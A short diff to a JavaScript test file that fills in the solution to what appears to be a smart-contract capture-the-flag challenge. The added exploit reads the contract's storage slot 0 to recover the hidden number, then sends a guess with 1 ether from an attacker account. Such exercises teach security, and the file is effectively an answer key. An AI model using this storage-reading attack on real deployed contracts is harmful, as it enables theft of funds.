@@ -24,9 +24,10 @@ describe('GuessTheRandomNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const answer = await provider.getStorageAt(target.address, 0);
+    await target.connect(attacker).guess(answer, {
+      value: utils.parseEther('1'),
+    });
 
     expect(await target.isComplete()).to.equal(true);
   });
